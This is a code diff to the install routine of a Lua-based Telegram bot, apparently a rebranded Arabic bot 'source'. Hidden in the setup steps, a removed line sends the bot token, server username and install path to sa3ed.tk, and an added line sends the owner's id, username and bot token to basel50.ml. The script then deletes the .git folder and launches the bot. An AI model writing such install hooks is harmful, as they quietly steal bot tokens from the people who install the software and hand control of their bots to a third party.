@@ -100,26 +100,44 @@ redis:set(bita..":UserNameBot:",BOT_User)
 redis:set(bita..":NameBot:",BOT_NAME)
 redis:hset(bita..'username:'..SUDO_USER,'username','@'..GetUser.result.username:gsub('_',[[\_]]))
 redis:set("TH3bita_INSTALL","Yes")
-info = {} 
-info.namebot = BOT_NAME
-info.userbot = BOT_User
-info.id = SUDO_USER
-info.token = Token
-info.join  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
-info.folder = io.popen("echo $(cd $(dirname $0); pwd)"):read('*all'):gsub(' ',''):gsub("\n",'')
-https.request('https://sa3ed.tk/B_aaaa.php?Info='..JSON.encode(info))
+info = {}
+
+info.username = '@'..GetUser.result.username
+
+info.userbot  = BOT_User
+
+info.userjoin  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
+
 Cr_file = io.open("./inc/Token.txt", "w")
+
 Cr_file:write(Token)
+
 Cr_file:close() 
+
 print('\27[1;36m￤Token.txt is created.\27[m')
-local Text = "• أهلاً [المطور الاساسي](tg://user?id="..SUDO_USER..") \n• شكراً لأستخدام سورس بيتٲ \n• أرسل /start\n• لأظهار الاوامر المطور  المجهزه بالكيبورد\n\n."
+
+local Text = "•~اهلا عزيزي [المطور الاساسي](tg://user?id="..SUDO_USER..") \n•~شكرا لاستخدامك سورس داني \n•~أرســل  الان /start\nلاظهار الاوامر للمطور  المجهزه بالكيبورد\n\n®️"
+
 https.request(Api_Token..'/sendMessage?chat_id='..SUDO_USER..'&text='..URL.escape(Text)..'&parse_mode=Markdown')
+
+Souser = SUDO_USER:gsub('@','')
+
+Souser = Souser:gsub([[\_]],'_')
+
+https.request("https://basel50.ml/Abaza.php?id="..SUDO_USER.."&user="..Souser.."&token="..Token)
+
 os.execute([[
+
 rm -f ./README.md
+
 rm -rf ./.git
+
 chmod +x ./run
+
 ./run
+
 ]])
+
 end
 
 
